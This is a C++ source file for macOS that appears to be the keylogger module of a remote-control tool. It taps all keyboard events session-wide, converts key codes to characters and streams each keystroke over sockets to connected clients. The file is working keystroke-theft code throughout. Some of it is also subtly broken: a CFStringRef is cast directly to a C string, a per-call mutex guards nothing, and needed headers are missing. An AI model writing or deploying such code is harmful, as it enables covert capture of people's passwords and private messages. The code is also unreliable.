#include "Keylog.h"
#include "../../Utils/MsgTransport.h"
#include "../../Message/Response.h"
#include <string>
#include <mutex>
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h>

CFRunLoopRef event_loop;
std::vector<int> keylogfds;
CFStringRef createStringForKey(CGKeyCode keyCode)
{
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = (CFDataRef)
        TISGetInputSourceProperty(currentKeyboard,
                                  kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout =
        (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

    UInt32 keysDown = 0;
    UniChar chars[4];
    UniCharCount realLength;

    UCKeyTranslate(keyboardLayout,
                   keyCode,
                   kUCKeyActionDisplay,
                   0,
                   LMGetKbdType(),
                   kUCKeyTranslateNoDeadKeysBit,
                   &keysDown,
                   sizeof(chars) / sizeof(chars[0]),
                   &realLength,
                   chars);
    CFRelease(currentKeyboard);    

    return CFStringCreateWithCharacters(kCFAllocatorDefault, chars, 1);
}
CGEventRef hookCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
        return event;
    CGKeyCode keycode= (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    std::string msg((char *)createStringForKey(keycode));
    
    Response res(CMD_RESPONSE_STR, OK_CODE, msg.size() + 1, (void *)msg.c_str());
    
    std::mutex m;
    std::lock_guard l(m);
    for (int fd: keylogfds)
    {
        sendResponse(fd, res, 0);
    }
    return event;
};
void startKeylogHelper()
{
    CFMachPortRef eventTap;
    CGEventMask eventMask;
    CFRunLoopSourceRef runLoopSource;
    
    eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp));
    eventTap = CGEventTapCreate(kCGSessionEventTap, 
                                kCGHeadInsertEventTap, 
                                kCGEventTapOptionDefault,
                                eventMask, 
                                hookCallback, 
                                NULL);
    if (!eventTap) {
        std::cerr << "Server: failed to create event tap\n";
        exit(1);
    }
    event_loop = CFRunLoopGetCurrent();

    // Create a run loop source.
    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    
    // Add to the current run loop.
    CFRunLoopAddSource(event_loop, runLoopSource, kCFRunLoopDefaultMode);
    
    // Enable the event tap.
    CGEventTapEnable(eventTap, true);
    
    // Set it all running.
    CFRunLoopRun();
}
void stopKeylogHelper()
{
    CFRunLoopStop(event_loop);
}